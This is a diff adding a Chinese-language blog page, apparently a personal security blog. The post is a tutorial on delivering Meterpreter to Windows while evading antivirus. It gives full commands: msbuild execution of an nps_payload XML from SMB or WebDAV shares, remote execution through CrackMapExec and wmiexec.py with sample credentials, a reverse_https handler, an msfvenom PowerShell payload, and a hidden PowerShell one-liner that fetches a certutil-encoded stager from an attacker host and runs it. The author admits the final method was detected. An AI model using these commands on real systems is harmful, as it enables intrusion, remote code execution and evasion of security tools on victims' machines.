@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Meterpreter Bypassing AntiVirus一、nps_payload安装： 1234git clone https://github.com/trustedsec/nps_payload.gitcd nps_payload/pip install -r requirements.txtpython nps_payload.py     Run &amp;quot;msfconsole">
+<meta name="keywords" content="bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用Meterpreter的多种姿势">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Meterpreter Bypassing AntiVirus一、nps_payload安装： 1234git clone https://github.com/trustedsec/nps_payload.gitcd nps_payload/pip install -r requirements.txtpython nps_payload.py     Run &amp;quot;msfconsole">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuu1u8ahqj20z40leq6c.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuuf146znj20jn03qmx7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvhxyqqt1j20rx0g0wg2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuuhvbjlqj20hd04c3yy.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvin22ys2j20oy03374c.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuun466tzj20kx0ibq4x.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvio52j9zj20oq02tglq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyviok4f3ej20od03874f.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj7h4f15j20h40ls41r.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj9bce27j20h40pcaf3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj9guau3j20hm0irwhl.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvjbn6tbgj20r80arjsa.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.256Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用Meterpreter的多种姿势">
+<meta name="twitter:description" content="Meterpreter Bypassing AntiVirus一、nps_payload安装： 1234git clone https://github.com/trustedsec/nps_payload.gitcd nps_payload/pip install -r requirements.txtpython nps_payload.py     Run &amp;quot;msfconsole">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuu1u8ahqj20z40leq6c.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>使用Meterpreter的多种姿势 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">使用Meterpreter的多种姿势
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-05 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-05T00:00:00+08:00">2019-01-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.8k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="Meterpreter-Bypassing-AntiVirus"><a href="#Meterpreter-Bypassing-AntiVirus" class="headerlink" title="Meterpreter Bypassing AntiVirus"></a>Meterpreter Bypassing AntiVirus</h1><h2 id="一、nps-payload"><a href="#一、nps-payload" class="headerlink" title="一、nps_payload"></a>一、nps_payload</h2><p>安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/trustedsec/nps_payload.git</span><br><span class="line">cd nps_payload/</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python nps_payload.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuu1u8ahqj20z40leq6c.jpg" alt></p>
+<blockquote>
+<ol>
+<li><p>Run &quot;msfconsole -r msbuild_nps.rc&quot; to start listener.</p>
+</li>
+<li><p>Choose a Deployment Option (a or b): - See README.md for more information.<br> a. Local File Deployment:</p>
+<ul>
+<li><p>%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml<br>b. Remote File Deployment:</folder_path_here></p>
+</li>
+<li><p>wmiexec.py <user>:&#39;<pass>&#39;@<rhost> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \<attackerip>&lt;share&gt;\msbuild_nps.xml</attackerip></rhost></pass></user></p>
+</li>
+</ul>
+</li>
+<li><p>Hack the Planet!!</p>
+</li>
+</ol>
+</blockquote>
+<p>开启SMB共享</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br><span class="line">cd /etc/samba/</span><br><span class="line">vi smb.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">添加</span><br><span class="line">[Guest]</span><br><span class="line">        comment = Guest</span><br><span class="line">        path = /tmp/share/</span><br><span class="line">        browseable = yes</span><br><span class="line">        read only = yes</span><br><span class="line">        guest ok = yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuuf146znj20jn03qmx7.jpg" alt></p>
+<p>连接：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvhxyqqt1j20rx0g0wg2.jpg" alt></p>
+<p>smb只能在内网共享，所以我想在公网使用没成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/share</span><br><span class="line">cp ~/nps_payload/msbuild_nps.xml /tmp/share/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuuhvbjlqj20hd04c3yy.jpg" alt></p>
+<p>开启msfconsole监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.xxx.xxx</span><br><span class="line">msf exploit(handler) &gt; set lport 443</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>三种方式获得shell</p>
+<p>①与主机有RDP连接，只需将此命令粘贴到命令提示符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvin22ys2j20oy03374c.jpg" alt></p>
+<p>②CrackMapExec</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x &apos;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml&apos;</span><br></pre></td></tr></table></figure>
+
+<p>③mpacket’s wimiexec.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml</span><br></pre></td></tr></table></figure>
+
+<p>在测试时，我在执行这些操作时遇到了一些麻烦。因此，我想到了一种更好的方式来交付有效载荷而不是使用SMB。我决定使用<a href="https://en.wikipedia.org/wiki/WebDAV" target="_blank" rel="noopener">WebDAV</a>。为何选择WebDAV？这是UNC路径的有趣之处。Windows将首先尝试通过端口445通过SMB访问主机。如果不能，它将尝试在端口80上使用WebDAV。这有用的原因有以下几点：</p>
+<ol>
+<li>SMB通常在防火墙处被阻止。如果我们想从远程系统中提取有效负载，这可能不起作用，因为端口445被阻止。</li>
+<li>从CrackMapExec版本4开始，它需要在端口445上运行的SMB服务器才能执行命令。我们不能同时在同一主机上使用我们的Samba共享和CME。</li>
+<li>如果担心基于网络的检测，WebDAV也可以通过HTTPS。</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyuun466tzj20kx0ibq4x.jpg" alt></p>
+<p>有很多方法可以设置WebDAV服务器。虽然您可以使用Apache，但我选择使用名为<a href="https://wsgidav.readthedocs.io/en/latest/" target="_blank" rel="noopener">WsgiDAV</a>的python工具为我创建一个。</p>
+<p>只需输入以下内容即可通过pip安装它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install WsgiDAV</span><br></pre></td></tr></table></figure>
+
+<p>要使用它，请运行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`pip install wsgidav cheroot``wsgidav --host=0.0.0.0 --port=80 --root=/tmp`</span><br></pre></td></tr></table></figure>
+
+<p>对于此示例，我将有效负载放在名为“ <em>test</em> ” 的文件夹中的<em>/ tmp /</em>目录中。</p>
+<p>要远程执行有效负载，我们运行一个非常相似的命令：</p>
+<p>CrackMapExec：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x &apos;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvio52j9zj20oq02tglq.jpg" alt></p>
+<p>Impacket的wimiexec.py：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py Administrator:Password123@192.168.137.1</span><br><span class="line">C:\&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyviok4f3ej20od03874f.jpg" alt></p>
+<p>有了它，我们现在无需使用SMB即可在目标上执行无文件执行。没有任何内容写入磁盘，没有SMB流量出站，并完全逃避反病毒软件。</p>
+<p><strong>注意</strong>：重启Kali Linux后，我在Windows主机上连接到Kali上的WebDAV服务器时出现问题。要修复它，我只是启动并停止了Samba。</p>
+<h2 id="二、使用CertUtil-exe进行内存中注入"><a href="#二、使用CertUtil-exe进行内存中注入" class="headerlink" title="二、使用CertUtil.exe进行内存中注入"></a>二、使用CertUtil.exe进行内存中注入</h2><p><a href="https://github.com/danielbohannon/Invoke-CradleCrafter" target="_blank" rel="noopener">Invoke-CradleCrafter</a>是PowerShell v2.0 +兼容的PowerShell远程下载底座生成器和混淆器。</p>
+<p>我将讨论使用PowerShell，Invoke-CradleCrafter和Microsoft的Certutil.exe来制作有效载荷和单行程序的步骤，这些程序可用于规避最新版本的Windows Defender（截至撰写本文时），以及作为不被入侵检测系统和行为分析捕获的提示。毕竟，PowerShell仍然是获得立足点的最简单和最好的方法之一，但与此同时它正在把你卖掉，因为它会在AMSI运行后立即与AMSI对话，这会让事情变得有点挑战。这种方法的优点在于，Microsoft的certutil会将网络调用到你的主要负载，同时看起来是一个无辜的小证书文件，而不是您的标准PowerShell Invoke-Shellcode摇篮。</p>
+<p><strong>设置要求：</strong> Linux，Metasploit，Invoke-CradleCrafter，适用于Linux的PowerShell和Windows 10.<br>安装<a href="https://github.com/PowerShell/PowerShell" target="_blank" rel="noopener">适用于Linux</a>和<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">Metasploit的</a><a href="https://github.com/PowerShell/PowerShell" target="_blank" rel="noopener">PowerShell</a>。</p>
+<p>当我这样做时，我更喜欢在Linux上运行PowerShell，因此Defender不会绊倒。<a href="https://github.com/danielbohannon/Invoke-CradleCrafter.git" target="_blank" rel="noopener">从GitHub下载Invoke-CradleCrafter。</a></p>
+<p>接下来，我们将通过执行以下操作创建base64编码的PowerShell Meterpreter有效负载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;YOUR IP HERE&gt; LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>请注意</strong>，只要certutil可以获取并阅读其内容，有效负载文件的扩展名就可以是任何内容。例如，组织可能具有不允许下载脚本的策略（或IDS，内容过滤器等），但是它们可能允许.txt文件甚至具有异常扩展的文件。如果您更改它，只需确保在Invoke-CradleCrafter中设置URL时进行补偿（见下文）。</p>
+<p>接下来，您将创建一个用于提供Web内容的文件夹。在此示例中，我们将调用文件夹有效内容。将PowerShell Meterpreter PowerShell脚本放在此文件夹中。</p>
+<p>接下来，我们将使用Invoke-CradleCrafter来模糊我们的certutil和PowerShell命令，这些命令将用于执行绕过Defender的内存中注入。</p>
+<p>通过键入pwsh或powershell，在Linux主机上进入PowerShell提示符。进入后<strong>，</strong>进入您的Invoke-CradleCrafter目录并运行以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Invoke-CradleCrafter.psd1</span><br><span class="line">Invoke-CradleCrafter</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj7h4f15j20h40ls41r.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET URL http://192.168.211.179/load.txt</span><br><span class="line">下一步键入MEMORY，然后键入CERTUTIL：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj9bce27j20h40pcaf3.jpg" alt></p>
+<p>接下来，您将看到您的混淆选项。我通常选择<strong>All</strong>然后输入<strong>1</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvj9guau3j20hm0irwhl.jpg" alt></p>
+<p>获得结果后，将其放在Windows计算机上名为raw.txt的文件中。您将使用certutil在base64中对此文件进行编码，以创建名为cert.cer的文件并将其放在Web服务器上。然后，我们将构建一个单行程，将远程调用以下拉该文件并将其在目标上执行。一旦执行，它将调用我们的有效负载load.txt并通过PowerShell将Meterpreter注入内存。</p>
+<p>使用certutil对raw.txt文件进行编码：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvjbn6tbgj20r80arjsa.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">One-liner:</span><br><span class="line"></span><br><span class="line">powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString(&apos;http://192.168.211.179/cert.cer&apos;); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cert.cer</span><br></pre></td></tr></table></figure>
+
+<p>被火绒杀了...想法很好但是没实现，算是拓宽了思维了。</p>
+<p>Reference：</p>
+<p><a href="https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/" target="_blank" rel="noopener">https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/" title="使用Meterpreter的多种姿势">https://wh0ale.github.io/2019/01/05/2019-1-4-使用Meterpreter的多种姿势/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i># bypass</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/05/2019-1-5-一篇文章带你理解漏洞之 PHP 文件包含漏洞/" rel="next" title="一篇文章带你理解漏洞之 PHP 文件包含漏洞">
+                <i class="fa fa-chevron-left"></i> 一篇文章带你理解漏洞之 PHP 文件包含漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/06/2019-1-6-Mysql提权/" rel="prev" title="mysql提权篇">
+                mysql提权篇 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
